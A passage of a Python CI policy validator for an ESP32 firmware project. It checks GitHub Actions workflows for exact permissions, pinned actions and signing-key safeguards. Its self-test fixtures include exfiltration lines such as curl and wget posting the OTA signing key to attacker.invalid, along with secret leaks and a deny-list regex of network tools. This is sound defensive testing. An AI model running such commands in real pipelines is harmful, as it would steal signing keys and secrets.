            "pull-requests": "read",
        },
        "signed-pr-preview.yml protected permissions must be exact for artifact, PR and branch-backed Pages access",
    )
    preview_checkout_refs = re.findall(
        r"^\s+ref:\s*([^\n#]+?)\s*$", signed["sign-preview"], re.MULTILINE
    )
    require(
        preview_checkout_refs
        == ["${{ github.sha }}", "${{ needs.validate.outputs.head-sha }}"]
        and signed["sign-preview"].count("persist-credentials: false") == 2,
        "signed-pr-preview.yml protected checkouts must use exact refs without persisted credentials",
    )
    require(
        "ref: ${{ needs.validate.outputs.head-sha }}" in signed["sign-preview"]
        and "path: _ci-source" in signed["sign-preview"]
        and "check-build-artifact-inventory.py" in signed["sign-preview"]
        and "--compare-to _ci-independent" in signed["sign-preview"]
        and "--source-root _ci-source" in signed["sign-preview"]
        and "name: trusted-preview-rebuild-${{ needs.validate.outputs.head-sha }}"
        in signed["sign-preview"]
        and "name: firmware-independent-rebuild" not in signed["sign-preview"]
        and "Revalidate PR immediately before key provisioning" in signed["sign-preview"]
        and signed["sign-preview"].index("check-build-artifact-inventory.py")
        < signed["sign-preview"].index("Revalidate PR immediately before key provisioning")
        < signed["sign-preview"].index("Provision OTA signing key"),
        "signed-pr-preview.yml must compare trusted independent bytes for the exact inert PR source",
    )
    require(
        signed["sign-preview"].count(TRUSTED_DEFAULT_ENV) == 3
        and signed["sign-preview"].count(TRUSTED_DEFAULT_FETCH) == 3
        and signed["sign-preview"].count(TRUSTED_DEFAULT_COMPARE) == 3,
        "signed-pr-preview.yml protected signer must bind key use and both publications "
        "to the current trusted default SHA",
    )
    for begin, end in (
        ("Revalidate PR immediately before key provisioning", "Provision OTA signing key"),
        ("Revalidate PR immediately before signed artifact upload",
         "Upload current-head signed hardware-test artifact"),
        ("Revalidate PR immediately before publication", "Publish signed PR preview to gh-pages"),
    ):
        start = signed["sign-preview"].find(begin)
        finish = signed["sign-preview"].find(end, start + 1)
        segment = signed["sign-preview"][start:finish]
        require(
            start >= 0 and finish > start
            and TRUSTED_DEFAULT_ENV in segment
            and TRUSTED_DEFAULT_FETCH in segment
            and TRUSTED_DEFAULT_COMPARE in segment,
            f"signed-pr-preview.yml {begin}: current trusted default SHA check is missing",
        )
    require(
        "_ci-source/" not in signed["sign-preview"]
        and "cd _ci-source" not in signed["sign-preview"]
        and "working-directory: _ci-source" not in signed["sign-preview"],
        "signed-pr-preview.yml protected job must never execute the inert PR checkout",
    )
    require(
        signed["sign-preview"].count(
            "./scripts/select-release-version.sh --latest-published-stable"
        ) == 1
        and 'version="${base}-PR-${PR_NUMBER}"' in signed["sign-preview"]
        and 'EXPECTED_VERSION: ${{ steps.trusted-version.outputs.version }}'
        in signed["sign-preview"]
        and 'if [ "$version" != "$EXPECTED_VERSION" ]; then' in signed["sign-preview"]
        and signed["sign-preview"].index(
            "./scripts/select-release-version.sh --latest-published-stable"
        ) < signed["sign-preview"].index("Provision OTA signing key"),
        "signed-pr-preview.yml protected signer must derive and require the exact stable-base version",
    )
    preview_pages_check = "python3 scripts/check-release-pages-bytes.py"
    preview_upload_revalidation = "Revalidate PR immediately before signed artifact upload"
    preview_upload = "actions/upload-artifact@"
    require(preview_pages_check in signed["sign-preview"] and
            signed["sign-preview"].index(preview_pages_check) <
            signed["sign-preview"].index("./scripts/publish-pages-branch.sh"),
            "signed-pr-preview.yml must bind all local 16/16 Pages parts before publication")
    preview_upload_revalidation = "Revalidate PR immediately before signed artifact upload"
    require(
        preview_upload_revalidation in signed["sign-preview"]
        and "actions/upload-artifact@" in signed["sign-preview"]
        and signed["sign-preview"].index(preview_pages_check)
        < signed["sign-preview"].index(preview_upload_revalidation)
        < signed["sign-preview"].index("actions/upload-artifact@"),
        "signed-pr-preview.yml must locally bind and revalidate immediately before each upload",
    )
    require(
        "name: tesla-key-esp32-pr${{ needs.validate.outputs.pr }}-${{ needs.validate.outputs.head-sha }}"
        in signed["sign-preview"],
        "signed-pr-preview.yml artifact name must bind the exact PR head SHA",
    )
    preview_root_paths = Counter(
        {
            template.format(version="${{ steps.metadata.outputs.version }}"): 1
            for template in SIGNED_ROOT_TEMPLATES
        }
    )
    require(
        signed_root_upload_paths(signed["sign-preview"]) == preview_root_paths
        and signed["sign-preview"].count(
            "python3 scripts/check-signed-root-inventory.py ."
        ) == 1
        and "tesla-key-esp32*.bin" not in signed["sign-preview"],
        "signed-pr-preview.yml must gate and explicitly list the exact 12 root BINs before upload",
    )
    require(
        preview_upload_revalidation in signed["sign-preview"] and
        signed["sign-preview"].index(preview_pages_check) <
        signed["sign-preview"].index(preview_upload_revalidation) <
        signed["sign-preview"].index(preview_upload) <
        signed["sign-preview"].index("Revalidate PR immediately before publication") <
        signed["sign-preview"].index("./scripts/publish-pages-branch.sh"),
        "signed-pr-preview.yml must revalidate the current PR head immediately before each upload",
    )
    require(
        "name: tesla-key-esp32-pr${{ needs.validate.outputs.pr }}-${{ needs.validate.outputs.head-sha }}"
        in signed["sign-preview"],
        "signed-pr-preview.yml signed artifact identity must include the exact PR head SHA",
    )
    preview_pages_source = "python3 scripts/check-pages-source.py"
    preview_publication_revalidation = "Revalidate PR immediately before publication"
    preview_publication = "- name: Publish signed PR preview to gh-pages"
    require(
        signed["sign-preview"].count(preview_pages_source) == 2
        and signed["sign-preview"].index("Revalidate PR immediately before key provisioning")
        < signed["sign-preview"].index("Provision OTA signing key")
        and signed["sign-preview"].index(preview_pages_check)
        < signed["sign-preview"].index(preview_publication_revalidation)
        < signed["sign-preview"].index(preview_publication),
        "signed-pr-preview.yml must validate branch-backed Pages before signing and publication",
    )
    require(
        'echo "trusted default branch advanced; refusing stale Pages publication" >&2\n'
        "            exit 1\n"
        "          fi\n\n"
        "      - name: Publish signed PR preview to gh-pages"
        in signed["sign-preview"],
        "signed-pr-preview.yml branch mutation must be adjacent to current-default validation",
    )

    cleanup = jobs_by_file.get("pr-preview-cleanup.yml")
    require(cleanup is not None and job_has_need(cleanup.get("reconcile-stale", ""), "discover-stale"),
            "pr-preview-cleanup.yml reconciliation DAG drifted")
    require(
        job_permissions(cleanup["cleanup-event"], "pr-preview-cleanup.yml:cleanup-event")
        == {"contents": "write", "pages": "read"}
        and job_permissions(cleanup["reconcile-stale"], "pr-preview-cleanup.yml:reconcile-stale")
        == {"contents": "write", "pages": "read", "pull-requests": "read"},
        "pr-preview-cleanup.yml mutator permissions must retain exact branch and Pages-read scope",
    )
    cleanup_source = "python3 scripts/check-pages-source.py"
    require(
        cleanup["cleanup-event"].count(cleanup_source) == 1
        and cleanup["reconcile-stale"].count(cleanup_source) == 1
        and cleanup["cleanup-event"].index(cleanup_source)
        < cleanup["cleanup-event"].index("./scripts/publish-pages-branch.sh rm")
        and cleanup["reconcile-stale"].index(cleanup_source)
        < cleanup["reconcile-stale"].index("./scripts/reconcile-pr-previews.sh remove-if-stale"),
        "pr-preview-cleanup.yml must validate branch-backed Pages before every branch mutation",
    )

    policy_text = contents.get("pr-policy.yml")
    policy = jobs_by_file.get("pr-policy.yml")
    require(policy_text is not None and policy is not None and "current-head-records" in policy,
            "pr-policy.yml current-head-records job is missing")
    require(re.search(r"^  pull_request_target:\s*$", policy_text, re.MULTILINE) is not None,
            "pr-policy.yml must use pull_request_target trusted-base execution")
    require("github.event.pull_request.base.sha" in policy_text,
            "pr-policy.yml must check out the exact trusted base SHA")
    require("github.event.pull_request.head" not in policy_text and "github.head_ref" not in policy_text,
            "pr-policy.yml must never reference a PR checkout")
    require("persist-credentials: false" in policy_text,
            "pr-policy.yml checkout credentials must not persist")
    require("require-pr-gates.sh" in policy["current-head-records"] and "--check --pr" in policy["current-head-records"],
            "pr-policy.yml must evaluate current server-side PR metadata")
    require("contents: write" not in policy_text and "pull-requests: write" not in policy_text,
            "pr-policy.yml must remain read-only")
    for name, text in contents.items():
        if name != "pr-policy.yml":
            require("pull_request_target:" not in text,
                    f"{name}: pull_request_target is reserved for trusted PR metadata policy")

    bench_text = contents.get("bench-acceptance.yml")
    bench = jobs_by_file.get("bench-acceptance.yml")
    require(bench_text is not None and bench is not None and set(bench) == {"ingest-report"},
            "bench-acceptance.yml must contain only the inert ingest-report job")
    bench_job = bench["ingest-report"]
    require("workflow_dispatch:" in bench_text and "pull_request" not in bench_text,
            "bench-acceptance.yml must be an explicit manual report ingest")
    require("report-json:" in bench_text and "artifact-run-id:" not in bench_text and
            "REPORT_JSON: ${{ inputs.report-json }}" in bench_job,
            "bench-acceptance.yml must ingest its own privacy-safe report-json dispatch input")
    expected_bench_actions = [
        "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
        "actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02",
    ]
    bench_actions = re.findall(r"^\s+uses:\s*([^\s#]+)", bench_job, re.MULTILINE)
    require(bench_actions == expected_bench_actions,
            "bench-acceptance.yml actions must be exactly trusted checkout plus artifact upload")
    expected_step_names = [
        "Check out trusted default-branch validator",
        "Materialize inert report input",
        "Validate schema, plausibility and requested identity",
        "Publish the validated inert report",
        "Record validated artifact identity",
    ]
    step_names = re.findall(r"^      - name:\s*([^\n]+?)\s*$", bench_job, re.MULTILINE)
    require(step_names == expected_step_names and len(re.findall(r"^      - ", bench_job, re.MULTILINE)) == 5,
            "bench-acceptance.yml step inventory must be exact")
    expected_run_blocks = (
        "set -euo pipefail\n"
        "umask 077\n"
        'mkdir -p "$(dirname "$REPORT_PATH")"\n'
        'printf \'%s\' "$REPORT_JSON" > "$REPORT_PATH"',
        "set -euo pipefail\n"
        "printf '%s' \"$EXPECTED_SHA\" | grep -Eq '^[0-9a-f]{40}$'\n"
        "printf '%s' \"$EXPECTED_ARTIFACT_SHA256\" | grep -Eq '^[0-9a-f]{64}$'\n"
        'python3 scripts/check-bench-acceptance.py "$REPORT_PATH" \\\n'
        '  --expect-source-sha "$EXPECTED_SHA" \\\n'
        '  --expect-artifact-sha256 "$EXPECTED_ARTIFACT_SHA256" \\\n'
        '  --expect-profile "$EXPECTED_PROFILE" \\\n'
        '  --expect-target "$EXPECTED_TARGET"\n'
        'report_sha256="$(sha256sum "$REPORT_PATH" | cut -d \' \' -f 1)"\n'
        "printf 'report-sha256=%s\\n' \"$report_sha256\" >> \"$GITHUB_OUTPUT\"",
        "set -euo pipefail\n"
        "{\n"
        "  printf '### Bench report ingest\\n\\n'\n"
        "  printf -- '- Report artifact: `%s`\\n' \"$ARTIFACT_NAME\"\n"
        "  printf -- '- Validated report.json SHA-256: `%s`\\n' \"$REPORT_SHA256\"\n"
        "  printf -- '- Actions artifact ID: `%s`\\n' \"$ARTIFACT_ID\"\n"
        "  printf -- '- Actions artifact digest: `%s`\\n' \"$ARTIFACT_DIGEST\"\n"
        "  printf -- '- Evidence boundary: schema/plausibility checked; bench observations, "
        "source, firmware hash, NVS preservation and signature verification are operator-declared.\\n'\n"
        '} >> "$GITHUB_STEP_SUMMARY"',
    )
    require(literal_run_blocks(bench_job) == expected_run_blocks,
            "bench-acceptance.yml run blocks must match the inert command allowlist exactly")
    require("github.ref == format('refs/heads/{0}', github.event.repository.default_branch)" in bench_job,
            "bench-acceptance.yml must refuse non-default-branch workflow code")
    require("ref: ${{ github.sha }}" in bench_job and "persist-credentials: false" in bench_job,
            "bench-acceptance.yml must check out the exact trusted dispatch commit")
    require("actions/download-artifact@" not in bench_job,
            "bench-acceptance.yml must produce its validated report, not download an absent producer")
    materialize = 'printf \'%s\' "$REPORT_JSON" > "$REPORT_PATH"'
    validator = 'python3 scripts/check-bench-acceptance.py "$REPORT_PATH"'
    report_digest = 'printf \'report-sha256=%s\\n\' "$report_sha256" >> "$GITHUB_OUTPUT"'
    uploader = "uses: actions/upload-artifact@"
    summary = "- name: Record validated artifact identity"
    require(materialize in bench_job and validator in bench_job and report_digest in bench_job and
            bench_job.count(uploader) == 1 and
            summary in bench_job and
            bench_job.index(materialize) < bench_job.index(validator) < bench_job.index(report_digest)
            < bench_job.index(uploader) < bench_job.index(summary),
            "bench-acceptance.yml must materialize, validate, fingerprint, upload and summarize in that order")
    require(
        report_digest + "\n      - name: Publish the validated inert report" in bench_job,
        "bench-acceptance.yml must upload immediately after fingerprinting the validated JSON",
    )
    require("expected-artifact-sha256:" in bench_text and
            "expected-source-sha:" in bench_text and "expected-profile:" in bench_text and
            "expected-target:" in bench_text and
            "EXPECTED_SHA: ${{ inputs.expected-source-sha }}" in bench_job and
            "EXPECTED_ARTIFACT_SHA256: ${{ inputs.expected-artifact-sha256 }}" in bench_job and
            "EXPECTED_PROFILE: ${{ inputs.expected-profile }}" in bench_job and
            "EXPECTED_TARGET: ${{ inputs.expected-target }}" in bench_job and
            "printf '%s' \"$EXPECTED_SHA\" | grep -Eq '^[0-9a-f]{40}$'" in bench_job and
            "printf '%s' \"$EXPECTED_ARTIFACT_SHA256\" | grep -Eq '^[0-9a-f]{64}$'" in bench_job and
            '--expect-source-sha "$EXPECTED_SHA"' in bench_job and
            '--expect-artifact-sha256 "$EXPECTED_ARTIFACT_SHA256"' in bench_job and
            '--expect-profile "$EXPECTED_PROFILE"' in bench_job and
            '--expect-target "$EXPECTED_TARGET"' in bench_job,
            "bench-acceptance.yml must compare all four explicit operator identity inputs")
    require("id: upload-report" in bench_job and
            "name: bench-acceptance-report-${{ github.run_id }}-${{ inputs.expected-source-sha }}" in bench_job and
            "path: ${{ runner.temp }}/bench-acceptance/report.json" in bench_job and
            "if-no-files-found: error" in bench_job,
            "bench-acceptance.yml upload must bind the run ID, source SHA and exact validated path")
    require("ARTIFACT_ID: ${{ steps.upload-report.outputs.artifact-id }}" in bench_job and
            "ARTIFACT_DIGEST: ${{ steps.upload-report.outputs.artifact-digest }}" in bench_job and
            "REPORT_SHA256: ${{ steps.validate-report.outputs.report-sha256 }}" in bench_job and
            '>> "$GITHUB_STEP_SUMMARY"' in bench_job and
            "operator-declared" in bench_job,
            "bench-acceptance.yml summary must record artifact ID/digest and the evidence boundary")
    require("secrets." not in bench_text and "actions: write" not in bench_text and
            "contents: write" not in bench_text,
            "bench-acceptance.yml must remain secret-free and read-only")
    require(not re.search(
        r"\b(?:curl|wget|ssh|scp|socat|telnet|esptool(?:\.py)?|idf\.py)\b|"
        r"/dev/(?:tty|cu\.)|https?://",
        bench_job,
    ), "bench-acceptance.yml must not contact or control hardware/vehicle/network endpoints")

    for key, expected_digest in EXPECTED_PRIVILEGED_JOB_SHA256.items():
        filename, job_name = key
        actual_digest = hashlib.sha256(
            jobs_by_file[filename][job_name].encode("utf-8")
        ).hexdigest()
        require(
            actual_digest == expected_digest,
            f"{filename}:{job_name}: exact privileged job schema drift "
            "(step order/name/uses/with/env/if/run must be reviewed as one unit)",
        )


def replace_once(path: Path, old: str, new: str) -> None:
    text = path.read_text(encoding="utf-8")
    if text.count(old) < 1:
        raise PolicyError(f"self-test fixture text is absent from {path.name}: {old}")
    path.write_text(text.replace(old, new, 1), encoding="utf-8")


def self_test(root: Path) -> None:
    validate(root)
    mutations = [
        ("action-pin", "build.yml", "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
         "actions/checkout@main", "40-hex"),
        ("action-owner", "build.yml",
         "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
         "attacker/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
         "action inventory drift"),
        ("action-valid-sha", "build.yml",
         "espressif/esp-idf-ci-action@e6f5c74232b1ccd4c97ed641f1e48553853f1fd5",
         "espressif/esp-idf-ci-action@0123456789abcdef0123456789abcdef01234567",
         "action inventory drift"),
        ("extra-build-job", "build.yml", "jobs:\n",
         "jobs:\n  exfiltrate:\n    runs-on: ubuntu-latest\n"
         "    timeout-minutes: 1\n    permissions:\n      contents: write\n"
         "    steps:\n      - run: true\n",
         "job inventory drift"),
        ("top-level-write", "build.yml", "permissions:\n  contents: read\n",
         "permissions:\n  contents: read\n  issues: write\n",
         "top-level permissions must be exact"),
        ("build-dag", "build.yml", "    needs: logic-test\n", "", "must need logic-test"),
        ("independent-dag", "build.yml", "    needs: [build, independent-rebuild]\n",
         "    needs: build\n", "both producer and independent rebuild"),
        ("deploy-dag", "build.yml", "    needs: [build, publish]\n",
         "    needs: build\n", "must need both build and successful immutable Release"),
        ("strict-host", "build.yml", "./scripts/run-mock-tests.sh --require-all",
         "./scripts/run-mock-tests.sh", "fail-closed host gate"),
        ("sanitizers", "build.yml", "./scripts/run-sanitizer-tests.sh --self-test",
         "true", "ASan/UBSan/LSan"),
        ("four-target-contract", "build.yml",
         "python3 scripts/check-build-gate-contract.py --self-test",
         "true", "four-target build contract"),
        ("unprivileged-secret", "build.yml",
         "      contents: read\n    steps:\n",
         "      contents: read\n    env:\n      LEAK: ${{ secrets.OTA_SIGNING_KEY }}\n    steps:\n",
         "secret reference inventory drift"),
        ("unprivileged-environment", "build.yml",
         "      contents: read\n    steps:\n",
         "      contents: read\n    environment: firmware-signing\n    steps:\n",
         "protected Environment inventory drift"),
        ("unprivileged-write", "build.yml",
         "  logic-test:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    permissions:\n      contents: read",
         "  logic-test:\n    runs-on: ubuntu-latest\n    timeout-minutes: 10\n    permissions:\n      contents: write",
         "permissions must match the exact reviewed inventory"),
        ("unprivileged-arbitrary-write", "build.yml",
         "      contents: read\n    steps:\n",
         "      contents: read\n      issues: write\n    steps:\n",
         "permissions must match the exact reviewed inventory"),
        ("unprivileged-id-token", "build.yml",
         "      contents: read\n    steps:\n",
         "      contents: read\n      id-token: write\n    steps:\n",
         "permissions must match the exact reviewed inventory"),
        ("exact-pr-head", "build.yml",
         "ref: ${{ github.event.pull_request.head.sha || github.sha }}",
         "ref: ${{ github.sha }}", "exact PR head"),
        ("signing-environment", "build.yml", "    environment: firmware-signing\n", "",
         "protected Environment inventory drift"),
        ("protected-extra-secret", "build.yml", "    environment: firmware-signing\n",
         "    environment: firmware-signing\n    env:\n"
         "      LEAK: ${{ secrets.EXTRA_SIGNING_SECRET }}\n",
         "secret reference inventory drift"),
        ("protected-id-token", "build.yml",
         "      pages: read\n      actions: read\n",
         "      pages: read\n      id-token: write\n      actions: read\n",
         "permissions must match the exact reviewed inventory"),
        ("main-pre-upload-revalidation", "build.yml",
         "Revalidate current Release candidate immediately before signed artifact upload",
         "Trust stale candidate before signed artifact upload",
         "pin all four production signatures"),
        ("main-root-glob-upload", "build.yml",
         "            tesla-key-esp32.bin\n",
         "            tesla-key-esp32*.bin\n",
         "explicitly list the exact 12 root BINs"),
        ("main-artifact-sha", "build.yml",
         "name: tesla-key-esp32-${{ needs.build.outputs.display-version }}-${{ github.sha }}",
         "name: tesla-key-esp32-${{ needs.build.outputs.display-version }}",
         "exact SHA/version-bound artifact identity"),
        ("main-stage-input", "build.yml",
         "            _fw/esp32/bootloader.bin\n", "",
         "exact 16 signer-owned layout inputs"),
        ("main-pages-source", "build.yml",
         'python3 scripts/check-pages-source.py "$pages_json"',
         'python3 scripts/check-pages-manifest.py "$pages_json"',
         "validate branch-backed Pages once before entering the signing boundary"),
        ("mixed-actions-pages", "build.yml",
         "      - name: Validate branch-backed Pages authority before signing\n",
         "      - name: Unexpected Actions Pages deploy\n"
         "        uses: actions/deploy-pages@cd2ce8fcbc39b97be8ca5fce6e763baed58fa128\n"
         "      - name: Validate branch-backed Pages authority before signing\n",
         "action inventory drift"),
        ("release-byte-bind", "build.yml", "python3 scripts/check-release-assets.py",
         "python3 scripts/missing-release-check.py", "validate mode metadata"),
        ("release-not-draft", "build.yml", "          draft: true\n",
         "          draft: false\n", "fail-closed between first publication"),
        ("release-publish-before-validation", "build.yml", "--expect-state draft",
         'gh api --method PATCH "repos/$GITHUB_REPOSITORY/releases/$release_id"\n'
         "            --expect-state draft", "order drifted"),
        ("release-final-state", "build.yml", "--expect-state published-immutable",
         "--expect-state draft", "draft bind/publish/immutable acceptance order drifted"),
        ("privileged-extra-step", "build.yml",
         "      - name: Provision OTA signing key\n",
         "      - name: Unexpected privileged run\n"
         "        run: true\n\n"
         "      - name: Provision OTA signing key\n",
         "exact privileged job schema drift"),
        ("privileged-curl", "build.yml", "          chmod 600 ota_signing_key.pem\n",
         "          chmod 600 ota_signing_key.pem\n"
         "          curl https://attacker.invalid/ --data-binary @ota_signing_key.pem\n",
         "exact privileged job schema drift"),
        ("privileged-wget", "build.yml", "          chmod 600 ota_signing_key.pem\n",
         "          chmod 600 ota_signing_key.pem\n"
         "          wget --post-file=ota_signing_key.pem https://attacker.invalid/\n",
         "exact privileged job schema drift"),
        ("privileged-background", "build.yml", "          chmod 600 ota_signing_key.pem\n",
         "          chmod 600 ota_signing_key.pem\n          true &\n",
         "exact privileged job schema drift"),
        ("privileged-key-read", "build.yml", "          chmod 600 ota_signing_key.pem\n",
         "          chmod 600 ota_signing_key.pem\n          sed -n '1p' ota_signing_key.pem\n",
         "exact privileged job schema drift"),
        ("privileged-key-copy", "build.yml", "          chmod 600 ota_signing_key.pem\n",
         "          chmod 600 ota_signing_key.pem\n          cp ota_signing_key.pem /tmp/key.pem\n",
         "exact privileged job schema drift"),
        ("privileged-run-substitution", "build.yml", "          chmod 600 ota_signing_key.pem\n",
         "          chmod 644 ota_signing_key.pem\n", "exact privileged job schema drift"),
        ("privileged-step-name", "build.yml", "Classify first publication or immutable reuse",
         "Classify publication loosely", "fail-closed between first publication"),
        ("privileged-env", "build.yml",
         "          RELEASE_VERSION: ${{ needs.build.outputs.release-version }}\n",
         "          RELEASE_VERSION: 0.0.0\n", "exact privileged job schema drift"),
        ("privileged-if", "build.yml",
         "        if: steps.release-mode.outputs.mode == 'reuse'\n",
         "        if: steps.release-mode.outputs.mode == 'create'\n",
         "key/sign/Release mutation must be create-only"),
        ("privileged-checkout-ref", "build.yml",
         "          ref: ${{ github.sha }}\n          fetch-depth: 0\n"
         "          persist-credentials: false\n\n"
         "      - name: Bind publish job to current main",
         "          ref: refs/heads/main\n          fetch-depth: 0\n"
         "          persist-credentials: false\n\n"
         "      - name: Bind publish job to current main",
         "checkout must be exact-SHA"),
        ("privileged-checkout-path", "build.yml",
         "          fetch-depth: 0\n          persist-credentials: false\n\n"
         "      - name: Bind publish job to current main",
         "          fetch-depth: 0\n          path: _alternate\n"
         "          persist-credentials: false\n\n"
         "      - name: Bind publish job to current main",
         "exact privileged job schema drift"),
        ("privileged-persist-credentials", "build.yml",
         "          persist-credentials: false\n\n"
         "      - name: Bind publish job to current main",
         "          persist-credentials: true\n\n"
         "      - name: Bind publish job to current main",
         "must not persist credentials"),
        ("privileged-with-path", "build.yml",
         "          name: firmware-unsigned\n          path: .\n",
         "          name: firmware-unsigned\n          path: _ci-input\n",
         "exact privileged job schema drift"),
        ("privileged-action-owner", "build.yml",
         "softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228",
         "trusted/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228",
         "action inventory drift"),
        ("privileged-action-sha", "build.yml",
         "softprops/action-gh-release@3d0d9888cb7fd7b750713d6e236d1fcb99157228",
         "softprops/action-gh-release@0123456789abcdef0123456789abcdef01234567",
         "action inventory drift"),
        ("preview-privileged-ref", "signed-pr-preview.yml",
         "      # The workflow and scripts always come from the trusted default branch, never the PR ref.\n"
         "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
         "        with:\n          ref: ${{ github.sha }}",
         "      # The workflow and scripts always come from the trusted default branch, never the PR ref.\n"
         "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
         "        with:\n          ref: refs/heads/main",
         "protected checkouts must use exact refs"),
        ("preview-privileged-path", "signed-pr-preview.yml", "          path: _ci-source\n",
         "          path: _ci-source-alt\n", "exact privileged job schema drift"),
        ("preview-privileged-persist", "signed-pr-preview.yml",
         "      # The workflow and scripts always come from the trusted default branch, never the PR ref.\n"
         "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
         "        with:\n          ref: ${{ github.sha }}\n          fetch-depth: 0\n"
         "          persist-credentials: false",
         "      # The workflow and scripts always come from the trusted default branch, never the PR ref.\n"
         "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
         "        with:\n          ref: ${{ github.sha }}\n          fetch-depth: 0\n"
         "          persist-credentials: true",
         "protected checkouts must use exact refs"),
        ("preview-privileged-run-id", "signed-pr-preview.yml",
         "          run-id: ${{ github.event.workflow_run.id }}\n",
         "          run-id: ${{ github.run_id }}\n", "exact privileged job schema drift"),
        ("protected-inventory", "build.yml", "check-build-artifact-inventory.py",
         "missing-build-artifact-inventory.py", "compare independent bytes"),
        ("protected-independent-compare", "build.yml", "--compare-to _ci-independent",
         "--compare-to .", "compare independent bytes"),
        ("final-release-metadata", "build.yml", '--release-json "$release_json"',
         '--release-json "$stale_release_json"', "fresh immutable Release metadata"),
        ("deploy-release-byte-bind", "build.yml",
         'python3 scripts/check-release-assets.py "$release_json" ./_deploy-input',
         "python3 scripts/missing-release-assets.py \"$release_json\" ./_deploy-input",
         "download the exact SHA/version artifact and revalidate"),
        ("local-pages-byte-bind", "build.yml", "python3 scripts/check-release-pages-bytes.py",
         "python3 scripts/missing-pages-byte-check.py", "local 16/16 Pages"),
        ("preview-pages-byte-bind", "signed-pr-preview.yml",
         "python3 scripts/check-release-pages-bytes.py",
         "python3 scripts/missing-pages-byte-check.py", "local 16/16 Pages"),
        ("preview-pages-source", "signed-pr-preview.yml",
         'python3 scripts/check-pages-source.py "$pages_json"',
         'python3 scripts/check-pages-manifest.py "$pages_json"',
         "branch-backed Pages before signing"),
        ("cleanup-pages-source", "pr-preview-cleanup.yml",
         'python3 scripts/check-pages-source.py "$pages_json"',
         'python3 scripts/check-pages-manifest.py "$pages_json"',
         "before every branch mutation"),
        ("preview-trusted-trigger", "signed-pr-preview.yml", "  workflow_run:\n",
         "  workflow_dispatch:\n", "default-branch-owned completed-build workflow_run"),
        ("preview-source-inventory", "signed-pr-preview.yml", "path: _ci-source",
         "path: _ci-missing", "exact inert PR source"),
        ("preview-executes-pr", "signed-pr-preview.yml",
         "          meta=_ci-input/dist/build-metadata.txt\n",
         "          bash _ci-source/scripts/ci-build-all.sh local local\n"
         "          meta=_ci-input/dist/build-metadata.txt\n",
         "must never execute the inert PR checkout"),
        ("preview-trusted-rebuild-ref", "signed-pr-preview.yml",
         "      - name: Check out exact PR head for isolated rebuild\n"
         "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
         "        with:\n"
         "          ref: ${{ needs.validate.outputs.head-sha }}",
         "      - name: Check out exact PR head for isolated rebuild\n"
         "        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n"
         "        with:\n"
         "          ref: ${{ github.event.workflow_run.head_sha }}",
         "default-owned, exact-head"),
        ("preview-trusted-nested-path", "signed-pr-preview.yml",
         "          ref: ${{ needs.validate.outputs.head-sha }}\n          fetch-depth: 0",
         "          ref: ${{ needs.validate.outputs.head-sha }}\n"
         "          path: _ci-rebuild-source\n          fetch-depth: 0",
         "producer-path-compatible"),
        ("preview-trusted-primary-access", "signed-pr-preview.yml",
         "uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7",
         "uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1",
         "action inventory drift"),
        ("preview-trusted-dag", "signed-pr-preview.yml",
         "    needs: [validate, trusted-rebuild]\n",
         "    needs: validate\n", "validation and trusted rebuild"),
        ("preview-untrusted-rebuild-artifact", "signed-pr-preview.yml",
         "      - name: Download trusted independent PR rebuild as data\n"
         "        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n"
         "        with:\n"
         "          name: trusted-preview-rebuild-${{ needs.validate.outputs.head-sha }}",
         "      - name: Download trusted independent PR rebuild as data\n"
         "        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n"
         "        with:\n"
         "          name: firmware-independent-rebuild", "trusted independent bytes"),
        ("preview-wrong-stable-base", "signed-pr-preview.yml",
         'if [ "$version" != "$EXPECTED_VERSION" ]; then',
         'if ! [[ "$version" =~ ^[0-9]+\\.[0-9]+\\.[0-9]+-PR-${PR_NUMBER}$ ]]; then',
         "exact stable-base version"),
        ("preview-independent-bytes", "signed-pr-preview.yml", "--compare-to _ci-independent",
         "--compare-to _ci-input", "trusted independent bytes"),
        ("preview-upload-head", "signed-pr-preview.yml",
         "name: tesla-key-esp32-pr${{ needs.validate.outputs.pr }}-${{ needs.validate.outputs.head-sha }}",
         "name: tesla-key-esp32-pr${{ needs.validate.outputs.pr }}",
         "exact PR head SHA"),
        ("preview-extra-root-upload", "signed-pr-preview.yml",
         "            tesla-key-esp32-c6.bin\n",
         "            tesla-key-esp32-c6.bin\n"
         "            tesla-key-esp32-surprise.bin\n",
         "explicitly list the exact 12 root BINs"),
        ("preview-pre-upload-revalidation", "signed-pr-preview.yml",
         "Revalidate PR immediately before signed artifact upload",
         "Validate stale signed artifact after upload", "current trusted default SHA"),
        ("preview-pre-key-revalidation", "signed-pr-preview.yml",
         "Revalidate PR immediately before key provisioning",
         "Revalidate PR after key provisioning", "trusted independent bytes"),
        ("preview-current-default", "signed-pr-preview.yml",
         TRUSTED_DEFAULT_ENV, "TRUSTED_DEFAULT_SHA: ${{ needs.validate.outputs.head-sha }}",
         "current trusted default SHA"),
        ("preview-artifact-head", "signed-pr-preview.yml",
         "name: tesla-key-esp32-pr${{ needs.validate.outputs.pr }}-${{ needs.validate.outputs.head-sha }}",
         "name: tesla-key-esp32-pr${{ needs.validate.outputs.pr }}",
         "exact PR head SHA"),
